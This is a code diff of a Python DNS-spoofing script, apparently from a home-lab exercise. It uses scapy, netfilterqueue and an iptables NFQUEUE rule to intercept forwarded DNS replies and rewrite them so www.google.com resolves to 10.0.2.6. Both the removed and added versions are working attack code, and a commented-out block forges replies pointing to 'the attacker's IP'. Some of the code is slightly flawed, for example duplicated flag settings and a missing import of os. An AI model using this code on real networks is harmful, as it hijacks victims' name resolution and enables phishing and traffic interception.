@@ -1,76 +1,58 @@
-from scapy.all import DNS, DNSQR, DNSRR, IP, UDP
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
-import os
-   
-host_table = { "google.com" : "192.168.56.102" }
+
+def modify(packet):
+
+    dnsPacket = IP(packet.get_payload())
+
+    print("og packet")
+    dnsPacket.show()
+    if dnsPacket[DNS].qr == 1:
+
+        #creating new packet to be sent
+        modifiedPacket = IP() / UDP() / DNS()
+        modifiedPacket[IP].src = dnsPacket[IP].src
+        modifiedPacket[IP].dst = dnsPacket[IP].dst
+        modifiedPacket[UDP].sport = dnsPacket[UDP].sport
+        modifiedPacket[UDP].dport = dnsPacket[UDP].dport
+
+        modifiedPacket[DNS].id = dnsPacket[DNS].id
+        modifiedPacket[DNS].op = 0
+        modifiedPacket[DNS].rcode = 0 
+        modifiedPacket[DNS].ra = 1
+        modifiedPacket[DNS].rd = 1
+        modifiedPacket[DNS].qd = dnsPacket[DNS].qd
+        modifiedPacket[DNS].aa = 1
+        modifiedPacket[DNS].rd = dnsPacket[DNS].rd
+        modifiedPacket[DNS].ra = dnsPacket[DNS].ra
+        modifiedPacket[DNS].ancount = 1
+        modifiedPacket[DNS].qdcount = 1
+        modifiedPacket[DNS].arcount = 0
+        modifiedPacket[DNS].nscount = 0
+        modifiedPacket[DNS].ns = None
+        modifiedPacket[DNS].ar = None
 
 
-def callback(pkt):
-    scapy_pkt = IP(pkt.get_payload())
+        modifiedPacket[DNS].an = DNSRR(rrname = "www.google.com", type=dnsPacket[DNS].an.type, rdata='10.0.2.6', rclass=dnsPacket[DNS].an.rclass, rdlen=dnsPacket[DNS].an.rdlen, ttl=100)
 
-    print("Working...")
-    print(scapy_pkt.show())
-    print(scapy_pkt.haslayer(DNSRR))
-    if scapy_pkt.haslayer(DNSRR):
+        #recalculate the checksum
+        print("new packet")
+        modifiedPacket.show2()
 
-        print("before", scapy_pkt.summary())
-        try: 
-            name = scapy_pkt[DNSQR].qname
-            if name not in host_table:
-                pass
-            else:
-                scapy_pkt[DNS].an = DNSRR(rrname=name, rdata=host_table[name])
-                scapy_pkt[DNS].ancount = 1
-                
-                del scapy_pkt[IP].len
-                del scapy_pkt[IP].chksum
-                del scapy_pkt[UDP].len
-                del scapy_pkt[UDP].chksum
+        packet.set_payload(bytes(modifiedPacket))
+    else: 
+        packet.accept()
+    
+    packet.accept()
 
-        except IndexError:
-            pass
-
-        print("After", scapy_pkt.summary())
-        pkt.set_payload(bytes(scapy_pkt))
-    pkt.accept()
-
+    
 
 def dns_spoof():
-
-    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")
-
+    
+    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num  1")
     queue = NetfilterQueue()
+    queue.bind(1, modify)
+    queue.run()
 
-    try: 
-        queue.bind(0, callback)
-        queue.run()
-    except KeyboardInterrupt:
-        os.system("iptables --flush")
-
-
-
-
-
-
-
-
-#     if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
-#         # Check if packet is a DNS query
-#         print("Received DNS request")
-
-#         # Construct a DNS response to redirect the query to the attacker's IP
-#         dns_resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-#                    UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
-#                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
-#                        an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata="192.168.56.103"))
-
-#         # Send the crafted DNS response
-#         send(dns_resp, verbose=False)
-#         return "Spoofed DNS Response Sent"
-
-# def start_spoof(interface):
-#     # Start sniffing for DNS queries on the specified interface
-#     sniff(filter="udp port 53", iface=interface, prn=dns_spoof)
 
 
